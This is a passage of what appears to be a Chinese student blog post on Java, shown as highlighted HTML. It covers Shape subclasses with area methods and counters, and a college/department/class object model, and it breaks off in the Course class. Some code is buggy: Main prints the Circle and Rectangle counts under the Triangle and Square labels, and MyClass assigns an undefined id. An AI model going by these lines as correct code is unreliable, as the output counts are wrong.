class="hljs-comment">//构造方法  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Square</span><span class="hljs-params">(<span class="hljs-type">float</span> a)</span>&#123;  <br>        <span class="hljs-built_in">this</span>.a = a;  <br>        SquareCount++;  <br>    &#125;  <br>    <span class="hljs-comment">//覆盖area方法  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">area</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-keyword">return</span> a * a;  <br>    &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getSquareCount</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> SquareCount;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>shape&#x2F;Triangle：</strong> 定义Triangle类，覆盖area方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> shape;  <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Triangle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span>&#123;  <br>    <span class="hljs-comment">//定义底a，高h  </span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> a,h;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">TriangleCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br><br>    <span class="hljs-comment">//构造方法  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Triangle</span><span class="hljs-params">(<span class="hljs-type">float</span> a, <span class="hljs-type">float</span> h)</span>&#123;  <br>        <span class="hljs-built_in">this</span>.a = a;  <br>        <span class="hljs-built_in">this</span>.h = h;  <br>        TriangleCount++;  <br>    &#125;  <br>    <span class="hljs-comment">//覆盖area方法  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">area</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0.5</span> * a * h;  <br>    &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getTriangleCount</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span>  TriangleCount;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>shape&#x2F;Rectangle：</strong> 定义Rectangle类，覆盖area方法 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> shape;  <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rectangle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span>&#123;  <br>    <span class="hljs-comment">//定义长a，宽b  </span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> a,b;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">rectangleCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br>    <span class="hljs-comment">//构造方法  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Rectangle</span><span class="hljs-params">(<span class="hljs-type">float</span> a, <span class="hljs-type">float</span> b)</span>&#123;  <br>        <span class="hljs-built_in">this</span>.a = a;  <br>        <span class="hljs-built_in">this</span>.b = b;  <br>        rectangleCount++;  <br>    &#125;  <br>    <span class="hljs-comment">//覆盖area方法  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">area</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-keyword">return</span> a * b;  <br>    &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getRectangleCount</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> rectangleCount;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>shape&#x2F;Circle：</strong> 定义Circle类，覆盖area方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> shape;  <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Circle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span>&#123;  <br>    <span class="hljs-comment">//定义半径r  </span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> r;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">circleCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br>    <span class="hljs-comment">//构造方法  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Circle</span><span class="hljs-params">(<span class="hljs-type">float</span> r)</span>&#123;  <br>        <span class="hljs-built_in">this</span>.r = r;  <br>        circleCount++;  <br>    &#125;  <br>    <span class="hljs-comment">//覆盖area方法  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">area</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-keyword">return</span> Math.PI * r * r;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getCircleCount</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> circleCount;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>app&#x2F;Main：</strong> 定义Main类，实现main方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> app;  <br><span class="hljs-keyword">import</span> shape.*;<span class="hljs-comment">//引入shape包  </span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;  <br>        <span class="hljs-type">Shape</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Square</span>(<span class="hljs-number">4</span>);  <br>        <span class="hljs-type">Shape</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Triangle</span>(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>);  <br>        <span class="hljs-type">Shape</span> <span class="hljs-variable">s2_2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Triangle</span>(<span class="hljs-number">5</span>,<span class="hljs-number">6</span>);  <br>        <span class="hljs-type">Shape</span> <span class="hljs-variable">s3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rectangle</span>(<span class="hljs-number">5</span>,<span class="hljs-number">4</span>);  <br>        <span class="hljs-type">Shape</span> <span class="hljs-variable">s3_2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rectangle</span>(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>);  <br>        <span class="hljs-type">Shape</span> <span class="hljs-variable">s3_3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rectangle</span>(<span class="hljs-number">10</span>,<span class="hljs-number">3</span>);  <br>        <span class="hljs-type">Shape</span> <span class="hljs-variable">s4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Circle</span>(<span class="hljs-number">7</span>);  <br><br>        System.out.println(<span class="hljs-string">&quot;Square&#x27;s area:&quot;</span>    + s1.area());  <br>        System.out.println(<span class="hljs-string">&quot;Triangle&#x27;s area:&quot;</span>  + s2.area());  <br>        System.out.println(<span class="hljs-string">&quot;Triangle&#x27;s area:&quot;</span>  + s2_2.area());  <br><br>        System.out.println(<span class="hljs-string">&quot;Rectangle&#x27;s area:&quot;</span> + s3.area());  <br>        System.out.println(<span class="hljs-string">&quot;Rectangle&#x27;s area:&quot;</span> + s3_2.area());  <br>        System.out.println(<span class="hljs-string">&quot;Rectangle&#x27;s area:&quot;</span> + s3_3.area());  <br><br>        System.out.println(<span class="hljs-string">&quot;Circle&#x27;s area:&quot;</span>    + s4.area());  <br>        System.out.println(<span class="hljs-string">&quot;Count:&quot;</span>   + Shape.ShapeCount());  <br><br>        System.out.println(<span class="hljs-string">&quot;总图形对象数目：&quot;</span> + Shape.ShapeCount());  <br>        System.out.println(<span class="hljs-string">&quot;Circle对象数目：&quot;</span> + Circle.getCircleCount());  <br>        System.out.println(<span class="hljs-string">&quot;Rectangle对象数目：&quot;</span> + Rectangle.getRectangleCount());  <br>        System.out.println(<span class="hljs-string">&quot;Triangle对象数目：&quot;</span> + Circle.getCircleCount());  <br>        System.out.println(<span class="hljs-string">&quot;Square对象数目：&quot;</span> + Rectangle.getRectangleCount());  <br><br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>运行结果：</strong><br><img src="/2025/04/02/Java%E7%BD%91%E7%BB%9C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/file-20250403213338618.png"></p><h1 id="建模实现"><a href="#建模实现" class="headerlink" title="建模实现"></a>建模实现</h1><p>某学院教学场景。</p><ul><li>学院有院长、内设若干系、实验中心及研究所；</li><li>每系有教师、学生、课程：按教学方案组织教学活动。</li><li>教师：若干，主要工作有教学（授课布置作业、出考题）、科研（课题研究、应用开发）等；</li><li>学生：按班级组织， 主要工作是上课、完成作业、参加考试；也可以参与科研或担任助教等；</li><li>课程有理论课、实习课、体育课等。</li></ul><p>使用java程序给上述场景建模并实现以下计算功能：<br>1、某门课程所有学生总分及平均分；<br>2、某学生所有课程成绩总分及平均分；<br>3、某教师所教授的所有学生人数。</p><h2 id="实现：-1"><a href="#实现：-1" class="headerlink" title="实现："></a>实现：</h2><p><strong>项目结构</strong></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">/src<br>|<span class="hljs-string">--/app</span><br><span class="hljs-string"></span>|<span class="hljs-string">  </span>|<span class="hljs-string">--Main</span><br><span class="hljs-string"></span>|<br>|<span class="hljs-string">--/college</span><br><span class="hljs-string"></span>|<span class="hljs-string">  </span>|<span class="hljs-string">--College</span><br><span class="hljs-string"></span>|<span class="hljs-string">  </span>|<span class="hljs-string">--Department</span><br><span class="hljs-string"></span>|<span class="hljs-string">  </span>|<span class="hljs-string">--LabCenter</span><br><span class="hljs-string"></span>|<span class="hljs-string">  </span>|<span class="hljs-string">--MyClass</span><br><span class="hljs-string"></span>|<span class="hljs-string">  </span>|<span class="hljs-string">--ResearchCenter</span><br><span class="hljs-string"></span>|<span class="hljs-string">  </span>|<span class="hljs-string">--Task</span><br><span class="hljs-string"></span>|<br>|<span class="hljs-string">--/course</span><br><span class="hljs-string"></span>|<span class="hljs-string">  </span>|<span class="hljs-string">--Course</span><br><span class="hljs-string"></span>|<span class="hljs-string">  </span>|<span class="hljs-string">--Score</span><br><span class="hljs-string"></span>|<br>|<span class="hljs-string">--/people</span><br><span class="hljs-string">   </span>|<span class="hljs-string">--Dean</span><br><span class="hljs-string">   </span>|<span class="hljs-string">--Person</span><br><span class="hljs-string">   </span>|<span class="hljs-string">--Student</span><br><span class="hljs-string">   </span>|<span class="hljs-string">--Teacher</span><br><span class="hljs-string">   </span>|<span class="hljs-string">--Dean</span><br></code></pre></td></tr></table></figure><p><strong>college&#x2F;College:</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> college;  <br><br><span class="hljs-keyword">import</span> java.util.ArrayList;  <br><span class="hljs-keyword">import</span> people.Dean;  <br><br><span class="hljs-comment">//学院  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">College</span> &#123;  <br>    <span class="hljs-keyword">private</span> String name;  <br>    <span class="hljs-keyword">private</span> Dean dean;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Department&gt; departments;  <span class="hljs-comment">// 院系列表  </span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">College</span><span class="hljs-params">(String name)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.name = name;  <br>        <span class="hljs-built_in">this</span>.dean = <span class="hljs-literal">null</span>;  <span class="hljs-comment">// 初始时院长为空  </span><br>        <span class="hljs-built_in">this</span>.departments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDean</span><span class="hljs-params">(Dean dean)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.dean = dean;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> Dean <span class="hljs-title function_">getDean</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> dean;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addDepartment</span><span class="hljs-params">(Department dept)</span> &#123;  <br>        departments.add(dept);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> name;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>college&#x2F;Department:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> college;  <br><span class="hljs-keyword">import</span> java.util.ArrayList;  <br><span class="hljs-keyword">import</span> people.Teacher;  <br><span class="hljs-keyword">import</span> people.Student;  <br><span class="hljs-keyword">import</span> course.Course;  <br><br><span class="hljs-comment">//院系  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Department</span> &#123;  <br>    <span class="hljs-keyword">private</span> String name;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Teacher&gt; teachers;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Student&gt; students;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Course&gt; courses;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;ResearchCenter&gt; researchCenters;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;LabCenter&gt; labCenters;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;MyClass&gt; myClasses;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Department</span><span class="hljs-params">(String name)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.name = name;  <br>        <span class="hljs-built_in">this</span>.teachers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>        <span class="hljs-built_in">this</span>.students = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>        <span class="hljs-built_in">this</span>.courses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>        <span class="hljs-built_in">this</span>.researchCenters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>        <span class="hljs-built_in">this</span>.labCenters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>        <span class="hljs-built_in">this</span>.myClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTeacher</span><span class="hljs-params">(Teacher teacher)</span> &#123;  <br>        teachers.add(teacher);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addStudent</span><span class="hljs-params">(Student student)</span> &#123;  <br>        students.add(student);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addCourse</span><span class="hljs-params">(Course course)</span> &#123;  <br>        courses.add(course);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addresearchCenter</span><span class="hljs-params">(ResearchCenter researchCenter)</span>&#123;  <br>        researchCenters.add(researchCenter);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addlabCenter</span><span class="hljs-params">(LabCenter labCenter)</span>&#123;  <br>        labCenters.add(labCenter);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addClasses</span><span class="hljs-params">(MyClass myclass)</span>&#123;  <br>        myClasses.add(myclass);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>college&#x2F;LabCenter:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> college;  <br><span class="hljs-keyword">import</span> java.util.ArrayList;  <br><span class="hljs-keyword">import</span> people.Teacher;  <br><span class="hljs-keyword">import</span> people.Student;  <br><br><span class="hljs-comment">//实验中心  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LabCenter</span> &#123;  <br>    <span class="hljs-keyword">private</span> String name;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Teacher&gt; teachers;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Student&gt; students;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">LabCenter</span><span class="hljs-params">(String name)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.name = name;  <br>        <span class="hljs-built_in">this</span>.teachers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>        <span class="hljs-built_in">this</span>.students = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTeacher</span><span class="hljs-params">(Teacher teacher)</span> &#123;  <br>        teachers.add(teacher);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addStudent</span><span class="hljs-params">(Student student)</span> &#123;  <br>        students.add(student);  <br>    &#125;  <br><br><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>college&#x2F;ReseachCenter:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 系（院系）类  </span><br><span class="hljs-keyword">package</span> college;  <br><span class="hljs-keyword">import</span> java.util.ArrayList;  <br><span class="hljs-keyword">import</span> people.Teacher;  <br><span class="hljs-keyword">import</span> people.Student;  <br><span class="hljs-keyword">import</span> course.Course;  <br><br><span class="hljs-comment">//研究所  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResearchCenter</span> &#123;  <br>    <span class="hljs-keyword">private</span> String name;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Teacher&gt; teachers;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Student&gt; students;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Task&gt; tasks;  <br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ResearchCenter</span><span class="hljs-params">(String name)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.name = name;  <br>        <span class="hljs-built_in">this</span>.teachers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>        <span class="hljs-built_in">this</span>.students = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>        <span class="hljs-built_in">this</span>.tasks = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br><br>    &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTeacher</span><span class="hljs-params">(Teacher teacher)</span> &#123;  <br>        teachers.add(teacher);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addStudent</span><span class="hljs-params">(Student student)</span> &#123;  <br>        students.add(student);  <br>    &#125;  <br><br>    <span class="hljs-comment">// 添加研究课题  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTask</span><span class="hljs-params">(Task task)</span> &#123;  <br>        tasks.add(task);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>college&#x2F;MyClass:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> college;  <br><span class="hljs-keyword">import</span> java.util.ArrayList;  <br><span class="hljs-keyword">import</span> people.Student;  <br><br><span class="hljs-comment">//班级  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;  <br>    <span class="hljs-keyword">private</span> String name;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Student&gt; students;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyClass</span><span class="hljs-params">(String name)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.name = name;  <br>        <span class="hljs-built_in">this</span>.id = id;  <br>        <span class="hljs-built_in">this</span>.students = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addStudent</span><span class="hljs-params">(Student student)</span> &#123;  <br>        students.add(student);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>college&#x2F;Task:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> college;  <br><br><span class="hljs-comment">//课题任务  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span> &#123;  <br>    <span class="hljs-keyword">private</span> String description;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Task</span><span class="hljs-params">(String description)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.description = description;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDescription</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> description;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>course&#x2F;Course:</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 